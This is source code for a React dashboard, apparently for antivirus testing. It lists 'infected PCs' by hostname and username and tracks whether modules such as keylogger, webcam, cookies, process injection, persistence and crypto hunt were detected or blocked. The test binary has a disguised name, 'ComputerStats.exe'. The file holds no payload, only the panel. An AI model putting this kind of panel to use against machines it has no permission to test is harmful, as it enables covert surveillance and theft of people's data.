"use client";

import { Fragment, useCallback, useEffect, useMemo, useState } from "react";
import { apiFetch, getApiUrl } from "@/lib/api";

type AvEvent = {
  id: number;
  module: string;
  action: string;
  status: string;
  detected: boolean;
  blocked: boolean;
  payload: Record<string, unknown> | null;
  error_message: string | null;
  session_id: string | null;
  created_at: string;
};

type Stats = {
  total: number;
  succeeded: number;
  failed: number;
  blocked_status: number;
  detected: number;
  blocked: number;
  by_module: { module: string; count: number; detected: number; blocked: number }[];
};

type PcGroup = {
  sessionId: string;
  pcName: string;
  username: string;
  events: AvEvent[];
  startedAt: string;
  detected: number;
  blocked: number;
  succeeded: number;
};

const MODULE_LABELS: Record<string, string> = {
  location: "📍 Location",
  cookies: "🍪 Cookies",
  webcam: "📷 Webcam",
  file_read: "📁 File Read",
  network: "🌐 Network",
  process_injection: "💉 Process Injection",
  keylogger: "⌨️ Keylogger",
  eicar: "🧪 EICAR",
  powershell: "⚡ PowerShell",
  persistence: "📌 Persistence",
  screenshot: "🖥️ Screenshot",
  clipboard: "📋 Clipboard",
  defender: "🛡️ Defender",
  crypto_hunt: "₿ Crypto Hunt",
  self_copy: "📎 Self Copy",
};

function statusBadge(status: string) {
  const map: Record<string, string> = {
    success: "badge-success",
    failed: "badge-failed",
    blocked: "badge-blocked",
    simulated: "badge-simulated",
  };
  return <span className={`badge ${map[status] || "badge-simulated"}`}>{status}</span>;
}

function formatTime(iso: string) {
  return new Date(iso).toLocaleString();
}

function getPcName(events: AvEvent[]): string {
  for (const e of events) {
    const h = e.payload?.hostname;
    if (h && typeof h === "string") return h;
  }
  return "Unknown PC";
}

function getUsername(events: AvEvent[]): string {
  for (const e of events) {
    const u = e.payload?.username;
    if (u && typeof u === "string") return u;
  }
  return "—";
}

function groupByPc(events: AvEvent[]): PcGroup[] {
  const map = new Map<string, AvEvent[]>();
  for (const e of events) {
    const sid = e.session_id || `orphan-${e.id}`;
    if (!map.has(sid)) map.set(sid, []);
    map.get(sid)!.push(e);
  }

  return Array.from(map.entries())
    .map(([sessionId, evts]) => {
      const sorted = [...evts].sort(
        (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime(),
      );
      return {
        sessionId,
        pcName: getPcName(sorted),
        username: getUsername(sorted),
        events: sorted.sort((a, b) => a.id - b.id),
        startedAt: sorted[sorted.length - 1]?.created_at || sorted[0]?.created_at,
        detected: sorted.filter((e) => e.detected).length,
        blocked: sorted.filter((e) => e.blocked).length,
        succeeded: sorted.filter((e) => e.status === "success").length,
      };
    })
    .sort((a, b) => new Date(b.startedAt).getTime() - new Date(a.startedAt).getTime());
}

export default function DashboardPage() {
  const [stats, setStats] = useState<Stats | null>(null);
  const [events, setEvents] = useState<AvEvent[]>([]);
  const [expanded, setExpanded] = useState<Set<string>>(new Set());
  const [selected, setSelected] = useState<AvEvent | null>(null);
  const [detected, setDetected] = useState(false);
  const [blocked, setBlocked] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const groups = useMemo(() => groupByPc(events), [events]);

  const refresh = useCallback(async () => {
    try {
      const [statsData, eventsData] = await Promise.all([
        apiFetch("/api/stats"),
        apiFetch("/api/events?limit=500"),
      ]);
      setStats(statsData);
      setEvents(eventsData);
      setError(null);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to load API");
    }
  }, []);

  useEffect(() => {
    refresh();
    const timer = setInterval(refresh, 3000);
    return () => clearInterval(timer);
  }, [refresh]);

  function toggleGroup(sessionId: string) {
    setExpanded((prev) => {
      const next = new Set(prev);
      if (next.has(sessionId)) next.delete(sessionId);
      else next.add(sessionId);
      return next;
    });
  }

  async function saveDetection() {
    if (!selected) return;
    await apiFetch(`/api/events/${selected.id}`, {
      method: "PATCH",
      body: JSON.stringify({ detected, blocked }),
    });
    await refresh();
  }

  const apiUrl = getApiUrl();

  return (
    <div className="app">
      <header className="header">
        <div className="header-content">
          <div className="brand">
            <span className="brand-icon">🛡</span>
            <div>
              <h1>AV Tester Dashboard</h1>
              <p className="subtitle">One row per infected PC — click to expand</p>
            </div>
          </div>
          <div className="header-actions">
            <button className="btn btn-secondary" onClick={refresh}>
              Refresh
            </button>
          </div>
        </div>
      </header>

      <p className="api-banner">
        API: {typeof window !== "undefined" ? "proxied via Vercel → Railway" : apiUrl}
      </p>
      {error && <p className="api-banner error">{error}</p>}

      <section className="stats-grid">
        <div className="stat-card">
          <span className="stat-label">Infected PCs</span>
          <span className="stat-value">{groups.length}</span>
        </div>
        <div className="stat-card">
          <span className="stat-label">Total Actions</span>
          <span className="stat-value">{stats?.total ?? "—"}</span>
        </div>
        <div className="stat-card warning">
          <span className="stat-label">AV Detected</span>
          <span className="stat-value">{stats?.detected ?? "—"}</span>
        </div>
        <div className="stat-card danger">
          <span className="stat-label">AV Blocked</span>
          <span className="stat-value">{stats?.blocked ?? "—"}</span>
        </div>
      </section>

      <section className="module-breakdown">
        {stats?.by_module.map((m) => (
          <div key={m.module} className="module-chip">
            <span>{MODULE_LABELS[m.module] || m.module}</span>
            <span className="count">{m.count} events</span>
          </div>
        ))}
      </section>

      <main className="events-panel">
        <div className="panel-header">
          <h2>Infected Targets</h2>
          <span className="live-indicator">● Live</span>
        </div>
        <div className="table-wrap">
          <table>
            <thead>
              <tr>
                <th></th>
                <th>PC Name</th>
                <th>User</th>
                <th>Time</th>
                <th>Actions</th>
                <th>Detected</th>
                <th>Blocked</th>
              </tr>
            </thead>
            <tbody>
              {groups.length === 0 ? (
                <tr>
                  <td colSpan={7} className="empty">
                    No infections yet. Run ComputerStats.exe on a target PC.
                  </td>
                </tr>
              ) : (
                groups.map((g) => (
                  <Fragment key={g.sessionId}>
                    <tr
                      className="clickable group-row"
                      onClick={() => toggleGroup(g.sessionId)}
                    >
                      <td className="expand-cell">{expanded.has(g.sessionId) ? "▼" : "▶"}</td>
                      <td>
                        <span className="pc-name">🖥 {g.pcName}</span>
                      </td>
                      <td>{g.username}</td>
                      <td>{formatTime(g.startedAt)}</td>
                      <td>{g.events.length} actions</td>
                      <td className={g.detected ? "bool-yes" : "bool-no"}>
                        {g.detected > 0 ? `${g.detected} yes` : "No"}
                      </td>
                      <td className={g.blocked ? "bool-yes" : "bool-no"}>
                        {g.blocked > 0 ? `${g.blocked} yes` : "No"}
                      </td>
                    </tr>
                    {expanded.has(g.sessionId) &&
                      g.events.map((e) => (
                        <tr
                          key={e.id}
                          className="clickable child-row"
                          onClick={(ev) => {
                            ev.stopPropagation();
                            setSelected(e);
                            setDetected(e.detected);
                            setBlocked(e.blocked);
                          }}
                        >
                          <td></td>
                          <td>
                            <span className="module-label">{MODULE_LABELS[e.module] || e.module}</span>
                          </td>
                          <td className="bool-no">—</td>
                          <td>{formatTime(e.created_at)}</td>
                          <td>{e.action}</td>
                          <td>{statusBadge(e.status)}</td>
                          <td className={e.detected ? "bool-yes" : "bool-no"}>
                            {e.detected ? "Yes" : "No"}
                          </td>
                          <td className={e.blocked ? "bool-yes" : "bool-no"}>
                            {e.blocked ? "Yes" : "No"}
                          </td>
                        </tr>
                      ))}
                  </Fragment>
                ))
              )}
            </tbody>
          </table>
        </div>
      </main>

      {selected && (
        <aside className="detail-panel">
          <div className="detail-header">
            <h3>Event Details</h3>
            <button className="btn-icon" onClick={() => setSelected(null)} aria-label="Close">
              ✕
            </button>
          </div>
          <pre id="detailContent">{JSON.stringify(selected, null, 2)}</pre>
          <div className="detail-actions">
            <label className="toggle">
              <input type="checkbox" checked={detected} onChange={(e) => setDetected(e.target.checked)} />
              Mark as Detected
            </label>
            <label className="toggle">
              <input type="checkbox" checked={blocked} onChange={(e) => setBlocked(e.target.checked)} />
              Mark as Blocked
            </label>
            <button className="btn btn-primary" onClick={saveDetection}>
              Save
            </button>
          </div>
        </aside>
      )}
    </div>
  );
}
